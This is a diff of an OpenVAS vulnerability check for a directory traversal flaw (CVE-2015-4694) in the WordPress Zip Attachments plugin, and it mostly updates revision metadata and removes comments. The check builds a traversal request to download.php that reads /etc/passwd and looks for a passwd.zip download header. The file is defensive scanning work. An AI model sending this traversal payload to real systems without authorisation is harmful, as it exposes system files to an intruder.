@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_zip_attachments_dir_trav_vuln.nasl 5513 2017-03-08 10:00:24Z teissa $
+# $Id: gb_wordpress_zip_attachments_dir_trav_vuln.nasl 11569 2018-09-24 10:29:54Z asteins $
 #
 # Wordpress Zip Attachments Plugin 'download.php' Directory Traversal Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807058");
-  script_version("$Revision: 5513 $");
+  script_version("$Revision: 11569 $");
   script_cve_id("CVE-2015-4694");
   script_bugtraq_id(75211);
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-08 11:00:24 +0100 (Wed, 08 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-24 12:29:54 +0200 (Mon, 24 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-02-05 12:32:21 +0530 (Fri, 05 Feb 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Wordpress Zip Attachments Plugin 'download.php' Directory Traversal Vulnerability");
@@ -50,11 +50,9 @@ if(description)
   script.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote
-  attackers to download arbitrary files and obtain sensitive information.
+  attackers to download arbitrary files and obtain sensitive information.");
 
-  Impact Level: Application");
-
-  script_tag(name:"affected", value:"Wordpress Zip Attachments plugin versions 
+  script_tag(name:"affected", value:"Wordpress Zip Attachments plugin versions
   before 1.1.5");
 
   script_tag(name:"solution", value:"Upgrade to version 1.1.5 or higher,
@@ -62,8 +60,8 @@ if(description)
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name : "URL" , value : "https://wpvulndb.com/vulnerabilities/8047");
-  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/06/12/4");
+  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/8047");
+  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/06/12/4");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
@@ -79,25 +77,16 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-dir = "";
-url = "";
-http_port = 0;
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-## Vulnerable URL
 url = dir + '/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../etc/passwd&za_filename=passwd';
 
-## Try attack and check the response to confirm vulnerability
 ## Not able to retrieve the content of zip file, i.e extra check is not possible
 if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:'Content-Disposition: attachment; filename="passwd.zip'))
